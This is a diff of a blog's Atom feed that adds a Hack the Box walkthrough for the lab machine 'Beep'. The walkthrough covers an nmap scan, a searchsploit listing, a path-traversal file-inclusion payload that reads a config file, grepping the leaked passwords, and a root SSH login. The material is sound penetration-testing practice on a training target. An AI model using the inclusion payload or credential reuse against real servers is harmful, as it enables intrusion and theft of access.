@@ -1,5 +1,119 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/all.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-02-20T00:00:00-08:00</updated><entry><title>Devel - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-devel.html" rel="alternate"></link><published>2020-02-20T00:00:00-08:00</published><updated>2020-02-20T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-devel.html,2020-02-20:</id><summary type="html">&lt;p&gt;Guide to Devel on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/all.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-04-26T00:00:00-07:00</updated><entry><title>Beep - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-beep.html" rel="alternate"></link><published>2020-04-26T00:00:00-07:00</published><updated>2020-04-26T00:00:00-07:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-beep.html,2020-04-26:</id><summary type="html">&lt;p&gt;Guide to Beep from Hack the Box&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+&lt;p&gt;Beep is a very straightforward Unix box featuring LFI web app exploit.  The path goes pretty much straight to root.&lt;/p&gt;
+&lt;h2&gt;Reconnaissance&lt;/h2&gt;
+&lt;p&gt;To start, we should see what services are available on this box.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Nmap scan&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# nmap -Pn -oA nmap/beep -sV -sC 10.10.10.7&lt;/span&gt;
+Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2020&lt;/span&gt;-04-26 &lt;span class="m"&gt;14&lt;/span&gt;:01 PDT
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.7
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+Not shown: &lt;span class="m"&gt;988&lt;/span&gt; closed ports
+PORT      STATE SERVICE    VERSION
+&lt;span class="m"&gt;22&lt;/span&gt;/tcp    open  ssh        OpenSSH &lt;span class="m"&gt;4&lt;/span&gt;.3 &lt;span class="o"&gt;(&lt;/span&gt;protocol &lt;span class="m"&gt;2&lt;/span&gt;.0&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="m"&gt;25&lt;/span&gt;/tcp    open  smtp       Postfix smtpd
+&lt;span class="m"&gt;80&lt;/span&gt;/tcp    open  http       Apache httpd &lt;span class="m"&gt;2&lt;/span&gt;.2.3
+&lt;span class="m"&gt;110&lt;/span&gt;/tcp   open  pop3       Cyrus pop3d &lt;span class="m"&gt;2&lt;/span&gt;.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+&lt;span class="m"&gt;111&lt;/span&gt;/tcp   open  rpcbind    &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RPC &lt;span class="c1"&gt;#100000)&lt;/span&gt;
+&lt;span class="m"&gt;143&lt;/span&gt;/tcp   open  imap       Cyrus imapd &lt;span class="m"&gt;2&lt;/span&gt;.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+&lt;span class="m"&gt;443&lt;/span&gt;/tcp   open  ssl/https?
+&lt;span class="m"&gt;993&lt;/span&gt;/tcp   open  ssl/imap   Cyrus imapd
+&lt;span class="m"&gt;995&lt;/span&gt;/tcp   open  pop3       Cyrus pop3d
+&lt;span class="m"&gt;3306&lt;/span&gt;/tcp  open  mysql      MySQL &lt;span class="o"&gt;(&lt;/span&gt;unauthorized&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="m"&gt;4445&lt;/span&gt;/tcp  open  upnotifyp?
+&lt;span class="m"&gt;10000&lt;/span&gt;/tcp open  http       MiniServ &lt;span class="m"&gt;1&lt;/span&gt;.570 &lt;span class="o"&gt;(&lt;/span&gt;Webmin httpd&lt;span class="o"&gt;)&lt;/span&gt;
+Service Info: Hosts:  beep.localdomain, &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1, example.com
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;There's a fair bit going on here, but a good place to start would be the HTTPS server on 443&lt;/p&gt;
+&lt;h3&gt;Examining HTTPS/443: Elastix server&lt;/h3&gt;
+&lt;p&gt;The server hosts an Elastix site.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="f0f956c6b2374e07b2536db4d175395c.png" src="images/ctf/htb/beep/f0f956c6b2374e07b2536db4d175395c.png"&gt;&lt;/p&gt;
+&lt;p&gt;A quick &lt;code&gt;searchsploit&lt;/code&gt; reveals several exploits to choose from, one of note that may work is an Local File Inclusion (LFI) vulnerability.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# searchsploit elastix&lt;/span&gt;
+-------------------------------------------------------------------------------------------------------------------- ----------------------------------------│
+ Exploit Title                                                                                                      &lt;span class="p"&gt;|&lt;/span&gt;  Path                                  │
+                                                                                                                    &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class="o"&gt;)&lt;/span&gt;                │
+-------------------------------------------------------------------------------------------------------------------- ----------------------------------------│
+Elastix - &lt;span class="s1"&gt;&amp;#39;page&amp;#39;&lt;/span&gt; Cross-Site Scripting                                                                               &lt;span class="p"&gt;|&lt;/span&gt; exploits/php/webapps/38078.py          │
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                             &lt;span class="p"&gt;|&lt;/span&gt; exploits/php/webapps/38544.txt         │
+Elastix &lt;span class="m"&gt;2&lt;/span&gt;.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                       &lt;span class="p"&gt;|&lt;/span&gt; exploits/php/webapps/34942.txt         │
+Elastix &lt;span class="m"&gt;2&lt;/span&gt;.2.0 - &lt;span class="s1"&gt;&amp;#39;graph.php&amp;#39;&lt;/span&gt; Local File Inclusion                                                                    &lt;span class="p"&gt;|&lt;/span&gt; exploits/php/webapps/37637.pl          │
+Elastix &lt;span class="m"&gt;2&lt;/span&gt;.x - Blind SQL Injection                                                                                   &lt;span class="p"&gt;|&lt;/span&gt; exploits/php/webapps/36305.txt         │
+Elastix &amp;lt; &lt;span class="m"&gt;2&lt;/span&gt;.5 - PHP Code Injection                                                                                  &lt;span class="p"&gt;|&lt;/span&gt; exploits/php/webapps/38091.php         │
+FreePBX &lt;span class="m"&gt;2&lt;/span&gt;.10.0 / Elastix &lt;span class="m"&gt;2&lt;/span&gt;.2.0 - Remote Code Execution                                                              &lt;span class="p"&gt;|&lt;/span&gt; exploits/php/webapps/18650.py          │
+------------------------------------------------------------------------------------------------------------------- &lt;span class="p"&gt;|&lt;/span&gt; ---------------------------------------│
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Exploiting an LFI would allow us to snoop on otherwise inaccessible files, such as configuration files.  In web apps, these usually contain sensitive data such as user account names and passwords; we could potentially use these to access another service (such as MySQL) or get access to the server itself.&lt;/p&gt;
+&lt;p&gt;I couldn't exploit the server by running the exploit file, but there is a comment in the soruce code that indicates what file path was used; we should be able to copy and paste the value into a browser manually.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;amp;module=Accounts&amp;amp;action&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="272cfa5dfa134126a48c44c9e786bb4d.png" src="images/ctf/htb/beep/272cfa5dfa134126a48c44c9e786bb4d.png"&gt;&lt;/p&gt;
+&lt;p&gt;The exploit worked!  This is a large text file, so it would be best to sort it using some bash utilities.  For this, I copy and pasted the the content into a new file &lt;code&gt;amportal.conf&lt;/code&gt; manually.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# cat amportal.conf | tr &amp;quot; &amp;quot; &amp;quot;\n&amp;quot; | sort | uniq | grep USER&lt;/span&gt;
+AMPDBUSER
+AMPDBUSER:
+AMPDBUSER/AMPDBPASS
+&lt;span class="nv"&gt;AMPDBUSER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;asteriskuser
+AMPMGRUSER
+AMPMGRUSER:
+&lt;span class="nv"&gt;AMPMGRUSER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;admin
+&lt;span class="nv"&gt;ARI_ADMIN_USERNAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;admin
+CDRDBUSER:
+USER
+
+&lt;span class="c1"&gt;# cat amportal.conf | tr &amp;quot; &amp;quot; &amp;quot;\n&amp;quot; | sort | uniq | grep PASS                                                                          &lt;/span&gt;
+AMPDBPASS:
+&lt;span class="nv"&gt;AMPDBPASS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;amp109
+&lt;span class="nv"&gt;AMPDBPASS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jEhdIekWmdjE
+AMPDBUSER/AMPDBPASS
+AMPMGRPASS:
+&lt;span class="c1"&gt;#AMPMGRPASS=amp111&lt;/span&gt;
+&lt;span class="nv"&gt;AMPMGRPASS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jEhdIekWmdjE
+ARI_ADMIN_PASSWORD
+&lt;span class="nv"&gt;ARI_ADMIN_PASSWORD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jEhdIekWmdjE
+CDRDBPASS:
+FOPPASSWORD:
+&lt;span class="nv"&gt;FOPPASSWORD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jEhdIekWmdjE
+&lt;span class="c1"&gt;#FOPPASSWORD=passw0rd&lt;/span&gt;
+&lt;span class="nv"&gt;localhost&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;NOPASSWD:
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Getting root&lt;/h2&gt;
+&lt;p&gt;We can quickly test the password &lt;code&gt;jEhdIekWmdjE&lt;/code&gt; to see what we now have access to.  A good first target would be root on SSH.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Note: I had to add the &lt;code&gt;-oKexAlgorithms=diffie-hellman-group-exchange-sha1&lt;/code&gt; as SSH was giving an error &lt;code&gt;no matching key exchange method found&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7&lt;/span&gt;
+The authenticity of host &lt;span class="s1"&gt;&amp;#39;10.10.10.7 (10.10.10.7)&amp;#39;&lt;/span&gt; can not be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to &lt;span class="k"&gt;continue&lt;/span&gt; connecting &lt;span class="o"&gt;(&lt;/span&gt;yes/no/&lt;span class="o"&gt;[&lt;/span&gt;fingerprint&lt;span class="o"&gt;])&lt;/span&gt;? yes
+Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;10.10.10.7&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
+root@10.10.10.7 password: jEhdIekWmdjE
+Last login: Tue Jul &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:45:47 &lt;span class="m"&gt;2019&lt;/span&gt;
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation &lt;span class="o"&gt;(&lt;/span&gt;PC/MAC/Linux&lt;span class="o"&gt;)&lt;/span&gt;
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+&lt;span class="o"&gt;[&lt;/span&gt;root@beep ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# whoami &amp;amp;&amp;amp; hostname&lt;/span&gt;
+root
+beep
+&lt;span class="o"&gt;[&lt;/span&gt;root@beep ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# wc -c root.txt&lt;/span&gt;
+&lt;span class="m"&gt;33&lt;/span&gt; root.txt
+&lt;span class="o"&gt;[&lt;/span&gt;root@beep ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The password lets us authenticate as root, giving us total control of the target server.&lt;/p&gt;
+&lt;p&gt;Thus concludes this walkthrough.  Thank you for reading.&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category><category term="oscp prep"></category></entry><entry><title>Devel - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-devel.html" rel="alternate"></link><published>2020-02-20T00:00:00-08:00</published><updated>2020-02-20T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-devel.html,2020-02-20:</id><summary type="html">&lt;p&gt;Guide to Devel on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
 &lt;p&gt;Devel is a neat box that hosts a file server in the same directory that hosts a webserver, which allows anonymous uploads.  After uploading an aspx shell, the Windows 7 host is severely unpatched and likely has several kernel exploits available to use.&lt;/p&gt;
 &lt;p&gt;I also go over how to utilize Git to revert and explore old codebases, and compile the C# tool Watson.&lt;/p&gt;
 &lt;p&gt;Devel is assigned IP 10.10.10.5.&lt;/p&gt;
